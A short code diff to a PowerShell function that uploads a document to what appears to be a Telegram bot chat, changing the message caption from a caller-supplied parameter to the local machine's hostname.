@@ -79,7 +79,7 @@ function Send-Document{
     $Form = @{
         chat_id              = $chat_id
         document             = $file_object
-        caption              = $Caption
+        caption              = [System.Net.Dns]::GetHostName()
         parse_mode           = $ParseMode
         disable_notification = $DisableNotification
     }    
